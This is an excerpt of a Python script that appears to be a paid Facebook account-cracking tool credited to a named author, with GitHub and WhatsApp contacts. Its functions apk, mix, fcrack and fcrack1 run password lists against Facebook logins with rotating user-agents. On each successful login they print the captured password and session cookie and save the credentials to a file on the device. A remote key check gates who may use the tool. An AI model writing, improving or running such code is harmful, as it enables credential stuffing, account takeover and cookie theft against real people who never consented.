...
def uaku():
    try:
        ...
        a=requests.get('https://raw.githubusercontent.com/farhanmallik/sdcard/paid-1.txt').text
        ff=open('show.txt','w')
...
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   : Farhan Mallik         │ 
\033[1;37m│ ❲★❳ GITHUB   : farhanmallik51            |
\033[1;37m│ ❲★❳ WHATSAPP : 01633579132         │
...
def apk(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[FARHAN] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/paid-1.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
        ...
        loop+=1
        sys.stdout.write(f'\r\033[m[FARHAN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}FARHAN{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def mix(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/paid-1.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [FARHAN>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/paid-1.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
...
def fcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[FARAHN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://x.facebook.com').text
...
def approval():
  ...
  id = "4h".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/farhanmallik51/apv/main/apv-a').text
    if id in httpCaht:
